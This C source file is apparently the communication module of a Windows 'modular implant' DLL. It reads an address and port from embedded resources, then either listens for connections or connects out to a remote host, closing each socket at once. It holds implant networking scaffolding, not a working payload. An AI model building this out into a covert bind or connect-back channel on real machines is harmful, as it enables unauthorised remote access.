#pragma comment(lib, "Ws2_32.lib")

#include <Winsock2.h>

#include <Windows.h>

#include "CommunicationModule.h"
#include "ImplantModule.h"
#include "ModularImplant.h"

BOOL WINAPI
DllMain(
	HINSTANCE hinstDLL,
	DWORD fdwReason,
	LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

BOOL
_Success_(return) GetConnectionInfo(
	_In_ HMODULE hModule,
	_In_ INT iConnInfoStrId,
	_Out_ PSOCKADDR_IN psinConnInfo)
{
	BOOL fReturn = TRUE;
	PVOID pBindIpAddressPortResource = NULL;
	PWSTR pwszBindIpAddressPort = NULL;
	DWORD dwBindIpAddressPortLen = 0;
	INT iAddressLength = sizeof(*psinConnInfo);
	HRESULT hResult = S_FALSE;

	if (FALSE == GetResourceData(hModule,
		iConnInfoStrId,
		&pBindIpAddressPortResource,
		&dwBindIpAddressPortLen))
	{
		LOG_ERROR("GetResourceData failed");
		fReturn = FALSE;
		goto end;
	}

	dwBindIpAddressPortLen += sizeof(*pwszBindIpAddressPort);
	pwszBindIpAddressPort = HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		dwBindIpAddressPortLen);
	if (NULL == pwszBindIpAddressPort)
	{
		LOG_ERROR("HeapAlloc failed");
		fReturn = FALSE;
		goto end;
	}

	hResult = StringCbCopyNW(pwszBindIpAddressPort,
		dwBindIpAddressPortLen,
		(STRSAFE_LPCWSTR)pBindIpAddressPortResource,
		dwBindIpAddressPortLen - sizeof(*pwszBindIpAddressPort));
	if (FAILED(hResult))
	{
		LOG_ERROR("StringCbCopyNW failed");
		HeapFree(GetProcessHeap(), 0, pwszBindIpAddressPort);
		fReturn = FALSE;
		goto end;
	}

	if (0 != WSAStringToAddressW(
		pwszBindIpAddressPort,
		AF_INET,
		NULL,
		(LPSOCKADDR)psinConnInfo,
		&iAddressLength))
	{
		LOG_ERROR("WSAStringToAddress failed");
		fReturn = FALSE;
		goto end;
	}

end:
	return fReturn;
}

BOOL
StartServer(
	HMODULE hModule)
{
	SOCKADDR_IN sinServer = { 0 };
	INT iAddressLength = sizeof(sinServer);
	SOCKET sServer = INVALID_SOCKET,
		sRemote = INVALID_SOCKET;
	BOOL fReturn = TRUE;

	if (FALSE == GetConnectionInfo(hModule,
		CMRID_BindIpAddressPort,
		&sinServer))
	{
		goto end;
	}
	
	sServer = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (INVALID_SOCKET == sServer)
	{
		LOG_ERROR("WSASocket failed");
		fReturn = FALSE;
		goto end;
	}

	if (0 != bind(sServer, (const struct sockaddr*)&sinServer, iAddressLength))
	{
		LOG_ERROR("bind failed");
		fReturn = FALSE;
		goto end;
	}

	if (0 != listen(sServer, SOMAXCONN))
	{
		LOG_ERROR("listen failed");
		fReturn = FALSE;
		goto end;
	}

	while (TRUE)
	{
		sRemote = WSAAccept(sServer,
			NULL,
			NULL,
			NULL,
			0);
		if (INVALID_SOCKET == sRemote)
		{
			LOG_ERROR("WSAAccept failed");
			fReturn = FALSE;
			goto end;
		}
		else
		{
			LOG_MSG("Connection accepted!");
		}

		closesocket(sRemote);
		sRemote = INVALID_SOCKET;
	}


end:
	if (INVALID_SOCKET != sRemote)
	{
		closesocket(sRemote);
		sRemote = INVALID_SOCKET;
	}
	if (INVALID_SOCKET != sServer)
	{
		closesocket(sServer);
		sServer = INVALID_SOCKET;
	}

	return fReturn;
}

BOOL
ConnectRemote(
	HMODULE hModule)
{
	SOCKADDR_IN sinServer = { 0 };
	INT iAddressLength = sizeof(sinServer);
	SOCKET sRemote = INVALID_SOCKET;
	BOOL fReturn = TRUE;

	if (FALSE == GetConnectionInfo(hModule,
		CMRID_RemoteIpAddressPort,
		&sinServer))
	{
		fReturn = FALSE;
		goto end;
	}

	sRemote = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (INVALID_SOCKET == sRemote)
	{
		LOG_ERROR("WSASocket failed");
	}

	if (0 != WSAConnect(sRemote,
		(const struct sockaddr*)&sinServer,
		iAddressLength,
		NULL,
		NULL,
		NULL,
		NULL))
	{
		LOG_ERROR("WSAConnect failed");
		fReturn = FALSE;
		goto end;
	}
	else
	{
		LOG_MSG("Connection success!");
	}

end:
	if (INVALID_SOCKET != sRemote)
	{
		closesocket(sRemote);
	}

	return fReturn;
}

BOOL
Init(
	enum MODULE_INIT eModuleInitType,
	HMODULE hmThis)
{
	WSADATA WSAData = { 0 };

	if (0 != WSAStartup(MAKEWORD(2, 2), &WSAData))
	{
		LOG_ERROR("WSAStartup failed");
		return FALSE;
	}

	switch (eModuleInitType)
	{
	case MODULE_INIT_LOCAL:
		StartServer(hmThis);
		break;
	case MODULE_INIT_REMOTE:
		ConnectRemote(hmThis);
		break;
	default:
		break;
	}

	return TRUE;
}